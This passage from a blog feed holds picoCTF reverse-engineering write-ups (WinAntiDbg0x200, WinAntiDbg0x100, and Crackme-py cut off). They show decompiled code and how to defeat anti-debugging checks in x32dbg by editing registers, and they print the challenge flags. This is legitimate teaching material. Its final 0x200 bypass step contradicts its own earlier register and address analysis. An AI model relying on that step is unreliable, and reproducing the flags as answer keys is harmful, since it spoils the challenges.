PID from arguments</li><li>Don’t worry about bypassing this, it’s just to make sure only one instance is running</li></ul><h3 id="3-Initial-debugger-check"><a href="#3-Initial-debugger-check" class="headerlink" title="#3. Initial debugger check"></a>#3. Initial debugger check</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uVar5 = FUN_00401600();</span><br><span class="line"><span class="keyword">if</span> ((uVar5 &amp; <span class="number">0xff</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">  FUN_00401910(<span class="string">&quot;### To start the challenge, you\&#x27;ll need to first launch this program using a debugger!\n&quot;</span>, in_stack_fffffff0);</span><br><span class="line">  <span class="keyword">goto</span> LAB_004018de;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Ironically requires a debugger to be present initially</li><li>If no debugger is detected, displays message to run with debugger</li><li>Don’t worry about bypassing this either, since we’ll have a debugger active anyways</li></ul><h3 id="4-Config-file-check"><a href="#4-Config-file-check" class="headerlink" title="#4. Config file check"></a>#4. Config file check</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iVar2 = FUN_00401450();</span><br><span class="line"><span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">  OutputDebugStringW(<span class="string">L&quot;### Error reading the \&#x27;config.bin\&#x27; file... Challenge aborted.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Verifies if “config.bin” file can be read</li><li>Aborts if file cannot be accessed</li><li>Again, don’t worry about bypassing this check</li></ul><h3 id="5-Custom-check"><a href="#5-Custom-check" class="headerlink" title="#5. Custom check"></a>#5. Custom check</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cVar1 = FUN_004011d0();</span><br><span class="line"><span class="keyword">if</span> (cVar1 == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">  <span class="comment">// Proceeds to next check if passed</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Must return ‘\0’ to continue</li><li>This will be the second check we bypass</li></ul><h3 id="6-Standard-debugger-check"><a href="#6-Standard-debugger-check" class="headerlink" title="#6. Standard debugger check"></a>#6. Standard debugger check</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BVar4 = IsDebuggerPresent();</span><br><span class="line"><span class="keyword">if</span> (BVar4 == <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="comment">// Proceeds to flag decryption if passed</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Standard Windows API to detect debuggers</li><li>Must return 0 (no debugger detected) to reach the flag</li><li>Third check we will bypass</li></ul><h3 id="7-Flag-decryption"><a href="#7-Flag-decryption" class="headerlink" title="#7. Flag decryption"></a>#7. Flag decryption</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">FUN_00401090(<span class="number">1</span>);</span><br><span class="line">FUN_00401180(DAT_0040509c);</span><br><span class="line">lpOutputString = FUN_00401000(DAT_004050a0);</span><br><span class="line"><span class="keyword">if</span> (lpOutputString == (LPWSTR)<span class="number">0x0</span>) &#123;</span><br><span class="line">  OutputDebugStringW(<span class="string">L&quot;### Something went wrong...\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  OutputDebugStringW(<span class="string">L&quot;### Good job! Here\&#x27;s your flag:\n&quot;</span>);</span><br><span class="line">  OutputDebugStringW(<span class="string">L&quot;### ~~~ &quot;</span>);</span><br><span class="line">  OutputDebugStringW(lpOutputString);</span><br><span class="line">  OutputDebugStringW((LPCWSTR)&amp;lpOutputString_004039c0);</span><br><span class="line">  OutputDebugStringW(<span class="string">L&quot;### (Note: The flag could become corrupted if the process state is tampered with in any way.)\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(lpOutputString);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Only runs if all previous checks pass</li><li>Decrypts and displays the flag</li><li>We want to reach this</li></ul><blockquote><p>HEAVY WORK IN PROGRESS BEYOND THIS POINT</p></blockquote><h2 id="Understanding-the-assembly"><a href="#Understanding-the-assembly" class="headerlink" title="Understanding the assembly"></a>Understanding the assembly</h2><p>Like in <em>WinAntiDbg0x100</em>, we will find the corresponding <code>TEST</code> calls for each crucial check. <strong>KEEP IN MIND</strong>: As discussed in my <a href="https://rivers.sh/posts/winantidbg0x100">WinAntiDbg0x100</a> writeup, the memory addresses in Ghidra and x32dbg might not line up exactly, but the last 4 digits will, so we’ll just use those (easier anyways). </p><p>Unlike WinAntiDbg0x100, this challenge uses both the EAX and EDX register, as well as both the JE and JNE jump instructions. Before explaining the assembly, let’s quickly refresh on the difference between <strong>JE &amp; JNE</strong>:</p><ul><li><strong>JE (Jump if Equal)</strong>: Jumps to a specified address if the comparison result is equal (zero flag is set). Also called JZ (Jump if Zero).</li><li><strong>JNE (Jump if Not Equal)</strong>: Jumps to a specified address if the comparison result is not equal (zero flag is clear). Also called JNZ (Jump if Not Zero).</li></ul><h3 id="First-Check-Admin-Privileges-Check-16eb"><a href="#First-Check-Admin-Privileges-Check-16eb" class="headerlink" title="First Check (Admin Privileges Check) - 16eb"></a>First Check (Admin Privileges Check) - 16eb</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">004016eb 85 c0       TEST     EAX,EAX</span><br><span class="line">004016ed 75 25       JNZ      LAB_00401714</span><br></pre></td></tr></table></figure><p>This check tests if the program has sufficient privileges:</p><ul><li><code>TEST EAX,EAX</code> performs a bitwise AND on EAX with itself (common way to check if a value is zero)</li><li><code>JNZ LAB_00401714</code> jumps if the result is not zero (meaning privileges are present), and we continue</li><li><code>If EAX = 0</code> (no privileges), it continues to the error message and exits, and we lose</li></ul><h3 id="Second-Check-if-cVar1-0-condition-1824"><a href="#Second-Check-if-cVar1-0-condition-1824" class="headerlink" title="Second Check (if (cVar1 == &#39;\0&#39;) condition) - 1824"></a>Second Check (<code>if (cVar1 == &#39;\0&#39;)</code> condition) - 1824</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00401824 85 d2       TEST     EDX,EDX</span><br><span class="line">00401826 75 0a       JNZ      LAB_00401832</span><br></pre></td></tr></table></figure><p>This corresponds to the <code>cVar1 = FUN_004011d0();</code> check</p><ul><li><code>TEST EDX,EDX</code> checks if EDX is zero</li><li><code>JNZ LAB_00401832</code> jumps if debugger is detected (EDX !&#x3D; 0)</li><li>If EDX &#x3D; 0 (no debugger detected by custom function), it continues to the next check</li></ul><h3 id="Third-Check-IsDebuggerPresent-Check-182e"><a href="#Third-Check-IsDebuggerPresent-Check-182e" class="headerlink" title="Third Check (IsDebuggerPresent Check) - 182e"></a>Third Check (IsDebuggerPresent Check) - 182e</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0040182e 85 c0       TEST     EAX,EAX</span><br><span class="line">00401830 74 15       JZ       LAB_00401847</span><br></pre></td></tr></table></figure><p>This corresponds to the <code>BVar4 = IsDebuggerPresent();</code> check</p><ul><li><code>TEST EAX,EAX</code> checks if EAX is zero</li><li><code>JZ LAB_00401847</code> jumps if EAX &#x3D; 0 (no debugger detected by Windows API)</li><li>This is the opposite logic from the previous checks - it jumps if condition is met (debugger not present)</li></ul><h2 id="Bypassing-all-3-checks"><a href="#Bypassing-all-3-checks" class="headerlink" title="Bypassing all 3 checks"></a>Bypassing all 3 checks</h2><p>Knowing this, all you have to do is manually set breakpoints at the corresponding instructions (16eb, 1824, 182e) and edit the EAX&#x2F;EDX values accordingly. </p><ol><li>16eb - <em>JNE call</em>, set <strong>EAX</strong> to 1 to take the jump (bypassing admin check)</li><li>1824 - <em>JNE call</em>, set <strong>EDX</strong> to 0 to avoid taking jump, as taking jump will skip over the 3rd check, subsequently denying the flag!) </li><li>1830 - <em>JE</em> call, set EDX to 0 to take the jump, giving us our flag</li></ol><p>flag: <code>picoCTF&#123;0x200_debug_f0r_Win_e6b68f6e&#125;</code></p>]]></content>
    
    
    <summary type="html">Further bypassing anti-debugging checks by editing register values</summary>
    
    
    
    <category term="CTF" scheme="https://rivers.sh/categories/CTF/"/>
    
    <category term="picoCTF2024" scheme="https://rivers.sh/categories/CTF/picoCTF2024/"/>
    
    
    <category term="Medium" scheme="https://rivers.sh/tags/Medium/"/>
    
    <category term="Reverse Engineering" scheme="https://rivers.sh/tags/Reverse-Engineering/"/>
    
    <category term="Assembly" scheme="https://rivers.sh/tags/Assembly/"/>
    
    <category term="x64dbg" scheme="https://rivers.sh/tags/x64dbg/"/>
    
    <category term="C" scheme="https://rivers.sh/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>WinAntiDbg0x100</title>
    <link href="https://rivers.sh/posts/winantidbg0x100/"/>
    <id>https://rivers.sh/posts/winantidbg0x100/</id>
    <published>2025-02-08T05:00:00.000Z</published>
    <updated>2025-04-23T22:35:37.912Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Challenge-Info"><a href="#Challenge-Info" class="headerlink" title="Challenge Info"></a>Challenge Info</h2><p>This challenge will introduce you to ‘Anti-Debugging.’ Malware developers don’t like it when you attempt to debug their executable files because debugging these files reveals many of their secrets! That’s why they include a lot of code logic specifically designed to interfere with your debugging process. Now that you’ve understood the context, go ahead and debug this Windows executable! This challenge binary file is a Windows console application and you can start with running it using <code>cmd</code> on Windows. Challenge can be downloaded <a href="https://artifacts.picoctf.net/c_titan/55/WinAntiDbg0x100.zip">here</a>. Unzip the archive with the password <code>picoctf</code></p><h2 id="This-challenge-is-1-of-a-3-part-seriesnext-WinAntiDbg0x200next-WinAntiDbg0x300"><a href="#This-challenge-is-1-of-a-3-part-seriesnext-WinAntiDbg0x200next-WinAntiDbg0x300" class="headerlink" title="This challenge is #1 of a 3 part seriesnext WinAntiDbg0x200next WinAntiDbg0x300"></a>This challenge is #1 of a 3 part series<br>next <a href="https://rivers.sh/posts/winantidbg0x200">WinAntiDbg0x200</a><br>next <a href="https://rivers.sh/posts/winantidbg0x300">WinAntiDbg0x300</a></h2><h2 id="Poking-around"><a href="#Poking-around" class="headerlink" title="Poking around"></a>Poking around</h2><p>First, I tried to run the executable, but had no success:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\riv\Desktop\pico\WinAntiDbg0x100&gt;WinAntiDbg0x100.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        _            _____ _______ ______</span><br><span class="line">       (_)          / ____|__   __|  ____|</span><br><span class="line">  _ __  _  ___ ___ | |       | |  | |__</span><br><span class="line"> | &#x27;_ \| |/ __/ _ \| |       | |  |  __|</span><br><span class="line"> | |_) | | (_| (_) | |____   | |  | |</span><br><span class="line"> | .__/|_|\___\___/ \_____|  |_|  |_|</span><br><span class="line"> | |</span><br><span class="line"> |_|</span><br><span class="line">  Welcome to the Anti-Debug challenge!</span><br><span class="line">### To start the challenge, you&#x27;ll need to first launch this program using a debugger!</span><br></pre></td></tr></table></figure><p>For analyzing, I prefer Ghidra over x32dbg. Searching through program text for the word “flag” yields a few results. </p><p><img src="/images/winantidbg0x100/search.png" alt="search"></p><p>After jumping to them:<br><img src="/images/winantidbg0x100/ghidrafun.png" alt="ghidrafun"></p><p>We notice function calls, conditional jumps, and debug checks.</p><hr><h2 id="Understanding-the-program"><a href="#Understanding-the-program" class="headerlink" title="Understanding the program"></a>Understanding the program</h2><p>Let’s understand <code>FUN_00401580</code>, I’ve left the code below for your convenience:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">undefined4 FUN_00401580(void)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  uint uVar1;</span><br><span class="line">  int iVar2;</span><br><span class="line">  BOOL BVar3;</span><br><span class="line">  LPWSTR lpOutputString;</span><br><span class="line">  undefined in_stack_fffffff4;</span><br><span class="line">  </span><br><span class="line">  uVar1 = FUN_00401130();</span><br><span class="line">  if ((uVar1 &amp; 0xff) == 0) &#123;</span><br><span class="line">    FUN_00401060(PTR_s________________________(_)_/_____00405020,in_stack_fffffff4);</span><br><span class="line">    FUN_00401060(&quot;### To start the challenge, you\&#x27;ll need to first launch this program using a debu gger!\n&quot;</span><br><span class="line">                 ,in_stack_fffffff4);</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    OutputDebugStringW(L&quot;\n&quot;);</span><br><span class="line">    OutputDebugStringW(L&quot;\n&quot;);</span><br><span class="line">    FUN_004011b0();</span><br><span class="line">    iVar2 = FUN_00401200();</span><br><span class="line">    if (iVar2 == 0) &#123;</span><br><span class="line">      OutputDebugStringW(L&quot;### Error reading the \&#x27;config.bin\&#x27; file... Challenge aborted.\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">      OutputDebugStringW(</span><br><span class="line">                        L&quot;### Level 1: Why did the clever programmer become a gardener? Because they  discovered their talent for growing a \&#x27;patch\&#x27; of roses!\n&quot;</span><br><span class="line">                        );</span><br><span class="line">      FUN_00401440(7);</span><br><span class="line">      BVar3 = IsDebuggerPresent();</span><br><span class="line">      if (BVar3 == 0) &#123;</span><br><span class="line">        FUN_00401440(0xb);</span><br><span class="line">        FUN_00401530(DAT_00405404);</span><br><span class="line">        lpOutputString = FUN_004013b0(DAT_00405408);</span><br><span class="line">        if (lpOutputString == (LPWSTR)0x0) &#123;</span><br><span class="line">          OutputDebugStringW(L&quot;### Something went wrong...\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">          OutputDebugStringW(L&quot;### Good job! Here\&#x27;s your flag:\n&quot;);</span><br><span class="line">          OutputDebugStringW(L&quot;### ~~~ &quot;);</span><br><span class="line">          OutputDebugStringW(lpOutputString);</span><br><span class="line">          OutputDebugStringW(L&quot;\n&quot;);</span><br><span class="line">          OutputDebugStringW(</span><br><span class="line">                            L&quot;### (Note: The flag could become corrupted if the process state is tam pered with in any way.)\n\n&quot;</span><br><span class="line">                            );</span><br><span class="line">          free(lpOutputString);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else &#123;</span><br><span class="line">        OutputDebugStringW(</span><br><span class="line">                          L&quot;### Oops! The debugger was detected. Try to bypass this check to get the  flag!\n&quot;</span><br><span class="line">                          );</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    free(DAT_00405410);</span><br><span class="line">  &#125;</span><br><span class="line">  OutputDebugStringW(L&quot;\n&quot;);</span><br><span class="line">  OutputDebugStringW(L&quot;\n&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Check-1"><a href="#Check-1" class="headerlink" title="Check #1"></a>Check #1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">uVar1 = FUN_00401130();</span><br><span class="line">if ((uVar1 &amp; 0xff) == 0) &#123;</span><br><span class="line">    FUN_00401060(PTR_s________________________(_)_/_____00405020,in_stack_fffffff4);</span><br><span class="line">    FUN_00401060(&quot;### To start the challenge, you\&#x27;ll need to first launch this program using a debugger!\n&quot;</span><br><span class="line">                 ,in_stack_fffffff4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>FUN_00401130()</code> is called, it returns a value stored in <code>uVar1</code>. Then, the program checks whether <code>(uVar1 &amp; 0xff) == 0</code>. </li><li>If <em>true</em>, the program prints a message prompting us to start it inside a debugger.</li><li>If <em>false</em>, we continue.</li></ul><p>Don’t worry about bypassing this, since we’ll have to use a debugger anyways.</p><h3 id="Check-2"><a href="#Check-2" class="headerlink" title="Check #2"></a>Check #2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">BVar3 = IsDebuggerPresent();</span><br><span class="line">if (BVar3 == 0) &#123;</span><br><span class="line">    FUN_00401440(0xb);</span><br><span class="line">    FUN_00401530(DAT_00405404);</span><br><span class="line">    lpOutputString = FUN_004013b0(DAT_00405408);</span><br><span class="line">    if (lpOutputString == (LPWSTR)0x0) &#123;</span><br><span class="line">        OutputDebugStringW(L&quot;### Something went wrong...\n&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        OutputDebugStringW(L&quot;### Good job! Here\&#x27;s your flag:\n&quot;);</span><br><span class="line">        OutputDebugStringW(L&quot;### ~~~ &quot;);</span><br><span class="line">        OutputDebugStringW(lpOutputString);</span><br><span class="line">        OutputDebugStringW(L&quot;\n&quot;);</span><br><span class="line">        OutputDebugStringW(</span><br><span class="line">            L&quot;### (Note: The flag could become corrupted if the process state is tampered with in any way.)\n\n&quot;</span><br><span class="line">        );</span><br><span class="line">        free(lpOutputString);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    OutputDebugStringW(</span><br><span class="line">        L&quot;### Oops! The debugger was detected. Try to bypass this check to get the flag!\n&quot;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This is the main anti-debugging check we need to bypass:</p><ul><li>The program calls <code>IsDebuggerPresent()</code>, which returns <em>True</em> (nonzero) if a debugger <em>is</em> detected.</li><li>If no debugger is found <code>(BVar3 == 0)</code>, the program proceeds to retrieve and display the flag. </li><li>If a debugger is detected, the program prints <code>### Oops! The debugger was detected. Try to bypass this check to get the flag!</code>.</li></ul><h2 id="Bypassing-Check-2"><a href="#Bypassing-Check-2" class="headerlink" title="Bypassing Check #2"></a>Bypassing Check #2</h2><p>In Ghidra, the <code>if (BVar3 == 0)</code> check corresponds to specific assembly instructions. If we look at the disassembly at address 00401602, we can see:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00401602 85 c0         TEST      EAX,EAX</span><br><span class="line">00401604 74 15         JZ        LAB_0040161b</span><br><span class="line">00401606 68 c8 35      PUSH      u_###_Oops!_The_debugger_was_detec_004035  LPCWSTR lpOutputString for O</span><br><span class="line">         40 00</span><br></pre></td></tr></table></figure><p>Understanding the assembly:</p><ul><li><code>TEST EAX,EAX</code> performs a bitwise AND of EAX with itself, setting the Zero Flag (ZF) if the result is zero</li><li><code>JZ LAB_0040161b</code> jumps to the flag-displaying code if ZF&#x3D;1 (meaning EAX&#x3D;0, no debugger detected)</li><li>If the jump isn’t taken, the error message is displayed</li></ul><p>To bypass this check, we’ll use x32dbg to:</p><ol><li>Open the program in x32dbg</li><li>Find the TEST instruction</li><li>Set a breakpoint at that instruction</li><li>When the breakpoint hits, manually force the Zero Flag to be set</li><li>Continue execution</li></ol><p>When opening the program in x32dbg, the addresses will be different from Ghidra due to how Windows loads executables in memory (ASLR - Address Space Layout Randomization). To find the same instruction:</p><ol><li>In Ghidra, the entry point is at <code>00401923</code></li><li>In x32dbg, the entry point might be at something like <code>006C1923</code></li><li>The last 4 digits remain the same, so we can find our <code>TEST</code> instruction at <code>006C1602</code> in x32dbg</li></ol><p>Once we find this instruction, we:</p><ol><li>Set a breakpoint at <code>006C1602</code>, which is where the <code>TEST</code> instruction lies</li><li>When it hits, edit the <code>EAX</code> value under the <em>FPU</em> window to be 0, indicating that a debugger is <em>NOT</em> present</li><li>Continue execution and get our flag</li></ol><p><img src="/images/winantidbg0x100/eax.png" alt="eax"></p><p>The flag will be under the “Log” tab. </p><p>flag: <code>picoCTF&#123;d3bug_f0r_th3_Win_0x100_cfbacfab&#125;</code></p>]]></content>
    
    
    <summary type="html">Bypassing simple anti-debugging techniques in a Windows executable through dynamic analysis</summary>
    
    
    
    <category term="CTF" scheme="https://rivers.sh/categories/CTF/"/>
    
    <category term="picoCTF2024" scheme="https://rivers.sh/categories/CTF/picoCTF2024/"/>
    
    
    <category term="Medium" scheme="https://rivers.sh/tags/Medium/"/>
    
    <category term="Reverse Engineering" scheme="https://rivers.sh/tags/Reverse-Engineering/"/>
    
    <category term="Assembly" scheme="https://rivers.sh/tags/Assembly/"/>
    
    <category term="x64dbg" scheme="https://rivers.sh/tags/x64dbg/"/>
    
    <category term="C" scheme="https://rivers.sh/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>Crackme-py</title>
    <link href="https://rivers.sh/posts/crackme-py/"/>
    <id>https://rivers.sh/posts/crackme-py/</id>
    <published>2024-11-02T04:00:00.000Z</published>
    <updated>2025-04-03T08:25:04.620Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Challenge-Info"><a href="#Challenge-Info" class="headerlink" title="Challenge Info"></a>Challenge Info</h2><p><a href="https://mercury.picoctf.net/static/f440bf2510a28914afae2947749f2db0/crackme.py">crackme.py</a></p><p>The code for your convenience:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Hiding this really important number in an obscure piece of code is brilliant!</span></span><br><span class="line"><span class="comment"># AND it&#x27;s encrypted!</span></span><br><span class="line"><span class="comment"># This want our biggest client to know his information is safe with us.</span></span><br><span class="line">bezos_cc_secret = <span class="string">&quot;A:4@r%uL`M-^M0c0AbcM-MFE0g4dd`_cgN&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Reference alphabet</span></span><br><span class="line">alphabet = <span class="string">&quot;!\&quot;#$%&amp;&#x27;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>+ \</span><br><span class="line">            <span class="string">&quot;[\\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_secret</span>(<span class="params">secret</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ROT47 decode</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    NOTE: encode and decode are the same operation in the ROT cipher family.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Encryption key</span></span><br><span class="line">    rotate_const = <span class="number">47</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Storage for decoded secret</span></span><br><span class="line">    decoded = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># decode loop</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> secret:</span><br><span class="line">        index = alphabet.find(c)</span><br><span class="line">        original_index = (index + rotate_const) % <span class="built_in">len</span>(alphabet)</span><br><span class="line">        decoded = decoded + alphabet[original_index]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(decoded)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose_greatest</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Echo the largest of the two numbers given by the user to the program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Warning: this function was written quickly and needs proper error handling</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    user_value_1 = <span class="built_in">input</span>(<span class="string">&quot;What&#x27;s your first number? &quot;</span>)</span><br><span class="line">    user_value_2 = <span class="built_in">input</span>(<span class="string">&quot;What&#x27;s your second number? &quot;</span>)</span><br><span class="line">    greatest_value = user_value_1 <span class="comment"># need a value to return if 1 &amp; 2 are equal</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> user_value_1 &gt; user_value_2:</span><br><span class="line">        greatest_value = user_value_1</span><br><span class="line">    <span class="keyword">elif</span> user_value_1 &lt; user_value_2:</span><br><span class="line">        greatest_value = user_value_2</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>( <span class="string">&quot;The number with largest positive magnitude is &quot;</span></span><br><span class="line">        + <span class="built_in">str</span>(greatest_value) )</span><br><span class="line"></span><br><span class="line">choose_greatest()</span><br></pre></td></tr></table></figure><h2 id="Understanding-crackme-py"><a href="#Understanding-crackme-py" class="headerlink" title="Understanding crackme.py"></a>Understanding crackme.py</h2><p>Let’s break down step-by-step what each part of <code>crackme.py</code> does:</p><ul><li>Reference alphabet is defined:<ul><li>A string called <code>alphabet</code> is defined, this includes special characters, numbers, and letters. This will be used as the foundation for encoding and decoding</li></ul></li><li><code>decode_secret</code> function is defined:<ul><li>The <code>decode_secret</code> function is made to decode a message, <code>bezos_cc_secret</code>, using ROT47</li><li>ROT47 works by shifting each character in the string by 47 positions (hence the 47) within the <code>alphabet</code> string</li><li>For each char in <code>bezos_cc_secret</code>, <code>decode_secret</code> will:<ul><li>Find the char’s position (index) in the <code>alphabet</code> string</li><li>Add 47 to the index, then wrap around the alphabet if needed, and find the new character</li><li>Append this new char to the decoded message</li><li>Then print the decoded message to reveal the hidden content of <code>bezos_cc_secret</code> (AKA our flag)</li></ul></li></ul></li><li><code>choose_greatest</code> function is defined:<ul><li>Prompts the user to enter a first and a second number (<code>user_value_1</code> and <code>user_value_2</code>)</li><li>Start with the assumption that <code>user_value_1</code> is the greatest</li><li>Compare <code>user_value_1</code> and <code>user_value_2</code> <em>as strings</em>:<ul><li>If <code>user_value_1</code> is larger, keep that as the largest</li><li>If <code>user_value_2</code> is larger, update <code>greatest_value</code> to <code>user_value_2</code></li></ul></li><li>Finally, print the greater number</li></ul></li><li>Run <code>choose_greatest</code>:<ul><li>The script finally calls 